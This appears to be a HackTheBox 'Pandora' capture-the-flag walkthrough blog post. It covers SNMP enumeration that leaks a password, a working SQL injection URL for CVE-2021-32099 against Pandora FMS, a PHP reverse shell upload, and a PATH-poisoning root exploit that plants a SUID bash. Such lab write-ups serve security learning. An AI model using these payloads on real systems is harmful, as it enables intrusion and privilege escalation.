@@ -1,0 +1,183 @@
+---
+title: "Pandora Hackthebox writeup"
+author: "0xMesbaha"
+cover: "/media/pandora/20220120210059.png"
+tags: ["Hackthebox", "snmp" ,"port-forwarding", "Path-Poisoning"]
+date: 2022-05-21T00:51:12+02:00
+draft: false
+---
+
+
+In This Box we are going to enumerate the snmp port which will show user daniel with his password as a string in the output , we are going to login with ssh to him and will see there is another user matt which has the user.txt , after some enumeration we will see there is pandora fms running internally with user matt , we will port forward to exploit the vulnerable service then we will abuse a path poisoning in a custom binary for the root access
+<!--more-->
+
+# Scanning  :
+
+initial scan :
+
+```bash
+nmap -sV -A -T 4 $IP -oN nmap/intial.txt 
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
+|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
+|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Play | Landing
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+```
+
+And i have learned the lesson from previous machines so will scan udp as well just in case 
+
+```bash
+sudo nmap -sV -sU  10.10.11.136
+
+PORT      STATE    SERVICE VERSION
+161/udp   open     snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
+17219/udp filtered chipper
+17989/udp filtered unknown
+46532/udp filtered unknown
+```
+
+# Enumeration :
+
+
+- port 80 : the web page :
+
+![error](/media/pandora/20220120195335.png)
+
+there is only this form where we can send data , parameters are :
+
+```cmd
+fullName=ADam&email=adma@testet.com&phone=a&message=a
+```
+
+testing them for sqli , ssti and more found out this is just a rabbit Hole :'')
+
+- we have found in the udp scan **snmp** is open so let's enumerate it , trying to enumerate with the community string "public" it works and we got results :
+
+```bash
+snmpwalk -c public -v1 10.10.11.136 > snmpwalk.out 
+```
+
+you can query about one thing with ``snmpwalk`` But i want to see all the data , finally will see this in the output 
+
+```bash
+iso.3.6.1.2.1.25.4.2.1.5.3068 = STRING: "-u daniel -p HotelBabylon23"
+```
+
+so we have a potential username and a password , we can try ssh with it :
+
+```bash
+ssh daniel@10.10.11.136
+```
+
+# Foothold :
+i have logged in with ``daniel`` However user ``matt`` is the one contains the ``user.txt`` and he only can read it 
+
+we need to escalate to ``matt`` then ``root``  
+
+![error](/media/pandora/20220521124027.png)
+
+after a lot of enumeration we will see  :
+
+![error](/media/pandora/20220521124108.png)
+
+the web page we have seen above is for the ``html`` But what about ``pandora`` ?
+
+![error](/media/pandora/20220521112241.png)
+
+
+and we will see it is owned by the user ``matt`` which we are targeting. 
+
+![error](/media/pandora/20220521123919.png)
+
+so it seems we need to do **Port forwarding** to interact with this page at the Browser.
+
+```bash
+# @ your side
+sudo ssh -N -L 0.0.0.0:9999:127.0.0.1:80 daniel@10.10.11.136
+```
+
+that will let us see this web page at ``http://127.0.0.1:9999`` 
+
+![error](/media/pandora/20220120200414.png)
+
+and we can see the version at the bottom of the page : **``v7.0NG.742_FIX_PERL2020``**
+
+searching for Vulnerabilities for this version will find  **``CVE-2021-32099``**  which is SQL injection in the session_id , and the payload is [here](https://github.com/ibnuuby/CVE-2021-32099)  and it is explained in the blog [here](https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained)
+
+```bash
+http://127.0.0.1:9999/pandora_console/include/chart_generator.php?session_id=a' UNION SELECT 'a',1,'id_usuario|s:5:"admin";' as data FROM tsessions_php WHERE '1'='1
+```
+
+all we need to do is to go back to **``http://127.0.0.1:9999/pandora_console/``**
+and we will have admin access as the admin cookie has been added
+
+![error](/media/pandora/20220120200737.png)
+
+Hence the site works with **PHP** we can know that from **wappalayzer** extension, so we need to upload a php reverse shell .
+
+It is located at ``/usr/share/webshells/php/php-reverse-shell.php`` in Linux or you can download it [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) By watching [here](https://www.youtube.com/watch?v=KX_jZsdgsJE&ab_channel=k4m1ll0-hackingchannel) we need to zip it then we can execute it at **``/pandora_console/extensions/shell.php``** 
+
+upload it at 
+```bash	
+admin tools > extensions manager > extension uploader
+``` 
+ 
+ Then set your listener and will get the shell after execute it at 
+``/pandora_console/extensions/shell.php``
+
+![error](/media/pandora/20220120204254.png)
+
+Once we are in we can generate ssh keys to get a stable shell 
+
+```bash
+kali@kali:~$ ssh-keygen -f pandora 
+```
+- normally we 'd use 
+```bash
+ssh-copy-id -i pandora.pub matt@10.10.11.136
+```    
+But hence we don't know matt's password , we would copy our key manually and add it to ``authorized_keys`` at matt's side 
+
+now copy ``pandora.pub`` into ``authorized_keys`` at the target machine ,  you can connect now:
+
+```bash
+kali@kali:~$  ssh matt@10.10.11.136 -i pandora
+```
+
+![error](/media/pandora/20220521120958.png)
+
+# Privilege escalation 
+Searching for SUID binaries found :
+
+![error](/media/pandora/20220521121149.png)
+
+The ``/usr/bin/pandora_backup`` seems odd , we can explore it with **strings** but it is not installed on the box , we can move it to our side and explore it or Just try ``strace`` first
+
+```bash
+strace /usr/bin/pandora_backup
+```
+
+we can see in the output :
+
+```bash
+tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied
+```
+
+it seems it uses ``tar`` command without providing Full path so that may let us do **Path Poisoning** .
+
+```bash
+echo "cp /bin/bash /tmp/bash ; chmod +s /tmp/bash" > tar
+chmod 777 tar
+export PATH=.:$PATH
+```
+
+![error](/media/pandora/20220521121710.png)
+
+### pwned 
